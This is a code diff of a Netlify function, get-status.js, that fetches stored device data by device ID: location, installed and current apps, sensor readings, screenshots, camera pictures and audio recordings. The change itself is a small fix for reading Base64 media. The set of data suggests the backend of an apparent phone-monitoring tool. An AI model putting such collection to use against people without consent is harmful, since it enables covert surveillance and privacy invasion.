@@ -1,43 +1,24 @@
 //
-// get-status.js (UPGRADED FOR NEW MEDIA TYPES & EFFICIENCY)
+// get-status.js (CORRECTED TO HANDLE RAW & JSON DATA)
 //
 const { getStore } = require("@netlify/blobs");
 
+// Get the site credentials from the environment variables to ensure we use the correct store
 const NETLIFY_SITE_ID = process.env.NETLIFY_SITE_ID;
 const NETLIFY_ACCESS_TOKEN = process.env.NETLIFY_ACCESS_TOKEN;
 
-// The full list of data types to fetch when a general refresh is requested.
+// The full list of data types to fetch. This list is correct.
 const ALL_DATA_TYPES = [
     // Core Device Status
-    "battery_status",
-    "screen_status",
-    "location",
-    "current_app",
-    "installed_apps",
-
-    // Raw Sensors (Tier 3 Fallback)
-    "accelerometer",
-    "gyroscope",
-    "magnetometer",
-
-    // Fused Orientation Sensors (Tier 1 & 2)
-    "gravity",
-    "rotation_vector",
-    "game_rotation_vector",
-    "geomagnetic_rotation_vector",
-    
-    // Contextual Sensors (Tier 1 & 2)
-    "proximity",
-    "light",
-    "pressure",
-    "pocket_mode",
-    "face_up_down",
-    "tilt_detector",
-
-    // --- NEW: Media Payloads ---
-    "screenshot",
-    "picture",
-    "last_recording"
+    "battery_status", "screen_status", "location", "current_app", "installed_apps",
+    // Raw Sensors
+    "accelerometer", "gyroscope", "magnetometer",
+    // Fused Orientation Sensors
+    "gravity", "rotation_vector", "game_rotation_vector", "geomagnetic_rotation_vector",
+    // Contextual Sensors
+    "proximity", "light", "pressure", "pocket_mode", "face_up_down", "tilt_detector",
+    // Media Payloads (Images & Audio)
+    "screenshot", "picture", "last_recording"
 ];
 
 exports.handler = async function(event) {
@@ -52,29 +33,37 @@ exports.handler = async function(event) {
       return { statusCode: 400, body: JSON.stringify({ error: 'Missing deviceId parameter.' }) };
     }
 
+    // Explicitly provide the siteID and token to guarantee we access the correct blob store.
     const store = getStore({
         name: "device-feedback", 
         siteID: NETLIFY_SITE_ID,
         token: NETLIFY_ACCESS_TOKEN
     });
     
-    // --- UPGRADE: Determine which data types to fetch ---
-    // If a specific 'type' is requested (e.g., 'installed_apps'), only fetch that.
-    // Otherwise, fetch the entire list for a full refresh.
     const dataTypesToFetch = requestedType ? [requestedType] : ALL_DATA_TYPES;
-    
     const allDeviceData = {};
 
+    // --- THIS IS THE CRITICAL FIX ---
+    // The logic inside this block now checks if the data type is a media file or a standard JSON object.
     const promises = dataTypesToFetch.map(async (dataType) => {
         const key = `${deviceId}_${dataType}`;
         try {
-            const data = await store.get(key, { type: 'json' });
-            if (data) {
-                allDeviceData[dataType] = data;
+            // Check if the data type is one of our Base64-encoded files
+            if (dataType === 'screenshot' || dataType === 'picture' || dataType === 'last_recording') {
+                // If it's a file, get the raw string data. DO NOT parse as JSON.
+                const data = await store.get(key);
+                if (data) {
+                    allDeviceData[dataType] = data;
+                }
+            } else {
+                // For all other data types, get and parse them as JSON objects.
+                const data = await store.get(key, { type: 'json' });
+                if (data) {
+                    allDeviceData[dataType] = data;
+                }
             }
         } catch (error) {
-            // It's common for a key not to be found, so we log it but don't fail the whole request.
-            // This can happen if, for example, a screenshot has never been taken.
+            // This log is still useful for keys that genuinely don't exist yet.
             console.log(`Info: No data found for key '${key}'. This might be expected.`);
         }
     });
